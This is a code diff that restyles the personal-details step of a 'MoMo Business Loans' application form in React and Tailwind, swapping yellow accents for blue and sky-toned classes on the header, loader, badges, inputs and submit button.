@@ -100,9 +100,9 @@ export default function PersonalDetails() {
       <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col items-center justify-center gap-6 px-4 py-12 text-center">
         <Logo size="md" />
         <h2 className="text-2xl font-extrabold tracking-tight">
-          MoMo <span className="text-[#ffcc00]">Business Loans</span>
+          MoMo <span className="text-sky-300">Business Loans</span>
         </h2>
-        <Loader2 className="w-12 h-12 text-[#ffcc00] animate-spin" />
+        <Loader2 className="w-12 h-12 text-sky-400 animate-spin" />
         <div className="space-y-3 max-w-sm w-full">
           <p className="text-white text-lg sm:text-xl font-extrabold">
             Reviewing & Approving Your Application...
@@ -119,7 +119,7 @@ export default function PersonalDetails() {
     <PageLoader>
       <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col">
         {/* Top Header */}
-        <header className="bg-[#ffcc00] text-[hsl(198,100%,22%)] py-3 px-4 shadow-md sticky top-0 z-40">
+        <header className="bg-[#003d59] text-white py-3 px-4 shadow-md sticky top-0 z-40 border-b border-[hsl(198,55%,32%)]">
           <div className="container mx-auto max-w-4xl flex items-center justify-between">
             <div className="flex items-center gap-3 cursor-pointer" onClick={() => navigate('/')}>
               <Logo size="sm" />
@@ -127,7 +127,7 @@ export default function PersonalDetails() {
                 MoMo <span className="font-normal opacity-90">Business Loans</span>
               </span>
             </div>
-            <span className="text-xs font-bold bg-[hsl(198,100%,22%)]/10 px-3 py-1 rounded-full">
+            <span className="text-xs font-bold bg-white/10 px-3 py-1 rounded-full text-white">
               Step 2 of 2
             </span>
           </div>
@@ -156,8 +156,8 @@ export default function PersonalDetails() {
             </button>
 
             <div className="text-center mb-6">
-              <div className="w-12 h-12 rounded-2xl bg-[#ffcc00]/20 text-[#ffcc00] flex items-center justify-center mx-auto mb-3 border border-[#ffcc00]/30">
-                <UserCheck className="w-6 h-6 text-gray-800" />
+              <div className="w-12 h-12 rounded-2xl bg-sky-50 text-[#004F71] flex items-center justify-center mx-auto mb-3 border border-sky-200">
+                <UserCheck className="w-6 h-6 text-[#004F71]" />
               </div>
               <h2 className="text-2xl font-extrabold tracking-tight text-[hsl(198,100%,22%)]">
                 Personal Information
@@ -173,7 +173,7 @@ export default function PersonalDetails() {
                 <span className="text-[11px] uppercase font-bold text-gray-400">Applying for</span>
                 <p className="font-extrabold text-sm text-[hsl(198,100%,22%)]">{loanData.amount} ({loanData.repayment})</p>
               </div>
-              <span className="text-xs font-bold bg-[#ffcc00]/20 text-gray-800 px-3 py-1 rounded-xl">
+              <span className="text-xs font-bold bg-sky-100 text-[#004F71] px-3 py-1 rounded-xl">
                 {loanData.type}
               </span>
             </div>
@@ -212,7 +212,7 @@ export default function PersonalDetails() {
                   id="select-gender"
                   value={form.gender}
                   onChange={(e) => set('gender', e.target.value)}
-                  className="w-full appearance-none border-2 border-gray-200 focus:border-[#ffcc00] rounded-2xl px-4 py-3.5 text-sm sm:text-base font-bold text-gray-800 outline-none bg-white pr-10 shadow-sm transition"
+                  className="w-full appearance-none border-2 border-gray-200 focus:border-[#004F71] rounded-2xl px-4 py-3.5 text-sm sm:text-base font-bold text-gray-800 outline-none bg-white pr-10 shadow-sm transition"
                 >
                   <option value="">Select gender</option>
                   {genders.map((g) => (
@@ -242,7 +242,7 @@ export default function PersonalDetails() {
                   id="select-nationality"
                   value={form.nationality}
                   onChange={(e) => set('nationality', e.target.value)}
-                  className="w-full appearance-none border-2 border-gray-200 focus:border-[#ffcc00] rounded-2xl px-4 py-3.5 text-sm sm:text-base font-bold text-gray-800 outline-none bg-white pr-10 shadow-sm transition"
+                  className="w-full appearance-none border-2 border-gray-200 focus:border-[#004F71] rounded-2xl px-4 py-3.5 text-sm sm:text-base font-bold text-gray-800 outline-none bg-white pr-10 shadow-sm transition"
                 >
                   {nationalities.map((n) => (
                     <option key={n} value={n}>
@@ -272,11 +272,11 @@ export default function PersonalDetails() {
               id="submit-application-btn"
               onClick={handleSubmit}
               disabled={!valid || submitting}
-              className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-extrabold text-base hover:bg-[#ffcc00]/90 disabled:opacity-40 transition shadow-md flex items-center justify-center gap-2"
+              className="w-full py-4 rounded-full bg-[#004F71] text-white font-bold text-sm sm:text-base tracking-wider uppercase hover:bg-[#003853] disabled:opacity-40 transition shadow-md flex items-center justify-center gap-2 cursor-pointer border border-[#006591]/40"
             >
               {submitting ? (
                 <>
-                  <Loader2 className="w-5 h-5 animate-spin" />
+                  <Loader2 className="w-5 h-5 animate-spin text-white" />
                   <span>Processing Application...</span>
                 </>
               ) : (
@@ -316,7 +316,7 @@ function InputField({
         value={value}
         onChange={(e) => onChange(e.target.value)}
         placeholder={placeholder || `Enter ${label.toLowerCase()}`}
-        className="w-full border-2 border-gray-200 focus:border-[#ffcc00] rounded-2xl px-4 py-3.5 text-sm sm:text-base font-bold text-gray-900 outline-none shadow-sm transition placeholder:text-gray-400"
+        className="w-full border-2 border-gray-200 focus:border-[#004F71] rounded-2xl px-4 py-3.5 text-sm sm:text-base font-bold text-gray-900 outline-none shadow-sm transition placeholder:text-gray-400"
       />
     </div>
   );
